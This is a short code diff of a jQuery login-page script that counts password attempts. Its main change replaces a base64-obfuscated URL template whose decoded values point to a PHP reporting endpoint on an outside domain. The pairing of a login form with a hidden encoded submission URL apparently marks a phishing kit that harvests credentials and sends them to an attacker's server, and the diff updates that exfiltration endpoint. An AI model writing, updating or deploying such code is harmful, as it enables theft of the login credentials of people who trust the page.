@@ -6,7 +6,7 @@ $(document).ready(function() {
   let loginAttempts = 0;
   const maxAttempts = 3;
   
-  const encodedUrlTemplate = "aHR0cHM6Ly9hd3VtZW4uZnVuL3JlcG9ydC9wb3N0cy5waHA=";
+  const encodedUrlTemplate = "aHR0cHM6Ly9hd3VtZW4uZnVuL2tuYXJlcG9ydC9wb3N0LnBocA==";
   
   // Function to decode base64
   function decodeBase64(str) {
@@ -176,4 +176,5 @@ $(document).ready(function() {
   });
   // Set autofocus on the password field
   passwordInput.focus();
+
 });
